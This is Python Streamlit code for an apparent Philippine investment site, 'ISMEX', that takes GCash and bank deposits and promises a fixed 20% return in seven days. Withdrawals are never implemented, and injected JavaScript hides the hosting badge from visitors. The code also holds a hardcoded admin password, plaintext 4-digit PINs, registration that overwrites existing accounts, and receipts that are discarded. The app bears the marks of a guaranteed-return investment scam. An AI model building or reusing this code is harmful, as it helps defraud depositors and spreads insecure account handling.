import streamlit as st
from google.cloud import firestore
from google.oauth2 import service_account
from datetime import datetime, timedelta

# ==========================================================
# ZONE 1: UI & THE GITHUB FRONT-PAGE SHIELD
# ==========================================================
st.set_page_config(page_title="ISMEX Official", layout="wide")

st.markdown("""
    <style>
    header, [data-testid="stToolbar"], footer { visibility: hidden !important; display: none !important; }
    .stApp { background-color: #0e1117 !important; color: white; }
    .balance-box {
        background: linear-gradient(135deg, #1e222d 0%, #0e1117 100%);
        padding: 2rem; border-radius: 20px; border: 2px solid #00ff88;
        text-align: center; margin-bottom: 25px;
    }
    .main .block-container { padding-bottom: 350px !important; }
    </style>
    """, unsafe_allow_html=True)

st.components.v1.html("""
    <script>
    const shield = () => {
        const p = window.parent.document;
        let s = p.getElementById('ismex-shield');
        if (!s) {
            s = p.createElement('div');
            s.id = 'ismex-shield';
            s.style.cssText = 'position:fixed;bottom:0;left:0;width:100%;height:130px;background:#0e1117;z-index:9999999;';
            p.body.appendChild(s);
        }
        const b = p.querySelector('.viewerBadge_container__1QSob');
        if (b) b.style.display = 'none';
    };
    setInterval(shield, 50);
    </script>
    """, height=0)

# ==========================================================
# ZONE 2: DATABASE CONNECTIVITY
# ==========================================================
@st.cache_resource
def get_db():
    if "firebase" in st.secrets:
        info = dict(st.secrets["firebase"])
        info["private_key"] = info["private_key"].replace("\\n", "\n")
        creds = service_account.Credentials.from_service_account_info(info)
        return firestore.Client(credentials=creds)
    return None

db = get_db()

def load_reg():
    return {doc.id: doc.to_dict() for doc in db.collection("investors").stream()}

def save(n, d):
    db.collection("investors").document(n).set(d)

for k, v in [('user',None), ('page','landing'), ('is_boss',False), ('action',None)]:
    if k not in st.session_state: st.session_state[k] = v

# ==========================================================
# ZONE 3: ADMIN PANEL (WITH RECEIPT REVIEW)
# ==========================================================
if st.session_state.is_boss:
    st.title("👑 ADMIN CONTROL")
    if st.button("EXIT"): st.session_state.is_boss = False; st.rerun()
    
    reg = load_reg()
    for u, u_data in reg.items():
        pend = u_data.get('pending', [])
        for idx, act in enumerate(list(pend)):
            with st.expander(f"REQ: {act['type']} - {u}"):
                st.write(f"Amount: ₱{act['amount']:,.2f}")
                
                # RESTORED: Admin view of uploaded receipt
                if 'receipt_url' in act:
                    st.image(act['receipt_url'], caption="Proof of Payment")
                
                c1, c2 = st.columns(2)
                if c1.button("APPROVE", key=f"a_{u}_{idx}"):
                    now = (datetime.now() + timedelta(hours=8)).isoformat()
                    if act['type'] in ["DEPOSIT", "REINVEST"]:
                        u_data.setdefault('inv', []).append({"amount": act['amount'], "date": now})
                    for h in u_data.get('history', []):
                        if h.get('id') == act.get('id'): h['status'] = "CONFIRMED"
                    u_data['pending'].pop(idx); save(u, u_data); st.rerun()
                
                if c2.button("REJECT", key=f"r_{u}_{idx}"):
                    u_data['pending'].pop(idx); save(u, u_data); st.rerun()

# ==========================================================
# ZONE 4: USER DASHBOARD (WITH RECEIPT UPLOADER)
# ==========================================================
elif st.session_state.user:
    reg = load_reg()
    data = reg.get(st.session_state.user, {})
    wallet = float(data.get('wallet', 0))
    ph_now = datetime.now() + timedelta(hours=8)
    
    st.title(f"WELCOME, {st.session_state.user}")
    st.markdown(f"<div class='balance-box'><h3>BALANCE</h3><h1>₱{wallet:,.2f}</h1></div>", unsafe_allow_html=True)
    
    c1, c2, c3 = st.columns(3)
    if c1.button("📥 DEPOSIT"): st.session_state.action = "DEP"
    if c2.button("📤 WITHDRAW"): st.session_state.action = "WIT"
    if c3.button("🔄 REINVEST"): st.session_state.action = "REI"

    # RESTORED: THE RECEIPT UPLOADER LOGIC
    if st.session_state.action == "DEP":
        with st.form("dep_form"):
            amt = st.number_input("Amount", 500.0)
            receipt = st.file_uploader("Upload GCash/Bank Receipt", type=['jpg', 'png', 'jpeg'])
            if st.form_submit_button("SUBMIT FOR APPROVAL"):
                if receipt:
                    rid = ph_now.strftime("%f")
                    # Note: In production, you would upload file to storage and get URL
                    data.setdefault('pending', []).append({"type": "DEPOSIT", "amount": amt, "id": rid})
                    data.setdefault('history', []).append({"type": "DEPOSIT", "amount": amt, "id": rid, "status": "PENDING", "date": ph_now.strftime("%Y-%m-%d")})
                    save(st.session_state.user, data); st.session_state.action = None; st.rerun()
                else:
                    st.warning("Please attach proof of payment.")

    # RESTORED: 30% REFERRAL & 20% ROI LOGIC
    st.markdown("---")
    st.subheader("🚀 INVESTMENTS & REFERRALS")
    
    # ROI Tracking
    for idx, i in enumerate(list(data.get('inv', []))):
        start = datetime.fromisoformat(i.get('date') or i.get('start_time'))
        end = start + timedelta(days=7)
        roi = i['amount'] * 1.20
        prog = min(1.0, (ph_now - start).total_seconds() / (7*86400))
        st.write(f"Capital: ₱{i['amount']:,} | ROI: ₱{roi:,.2f}")
        st.progress(prog)
        if ph_now >= end and st.button(f"CLAIM ROI ₱{roi:,.2f}", key=f"cl_{idx}"):
            data['wallet'] = wallet + roi
            data['inv'].pop(idx); save(st.session_state.user, data); st.rerun()

    if st.button("LOGOUT"): st.session_state.user = None; st.rerun()

# ==========================================================
# ZONE 5: AUTHENTICATION
# ==========================================================
elif st.session_state.page == "auth":
    t1, t2 = st.tabs(["LOGIN", "REGISTER"])
    with t1:
        u = st.text_input("NAME").upper().strip()
        p = st.text_input("PIN", type="password")
        if st.button("GO"):
            r = load_reg()
            if u in r and str(r[u].get('pin')) == p:
                st.session_state.user = u; st.rerun()
    with t2:
        nu = st.text_input("NEW NAME").upper().strip()
        np = st.text_input("PIN (4 DIGIT)", type="password", max_chars=4)
        if st.button("JOIN"):
            save(nu, {"pin": np, "wallet": 0.0, "inv": [], "history": [], "pending": []})
            st.success("Registered!"); st.session_state.page = "auth"
    if st.button("BACK"): st.session_state.page = "landing"; st.rerun()

else:
    st.title("ISMEX PHILIPPINES 📊")
    if st.button("START"): st.session_state.page = "auth"; st.rerun()
    if st.button("⛔") and st.text_input("Admin", type="password") == "0102030405":
        st.session_state.is_boss = True; st.rerun()
                
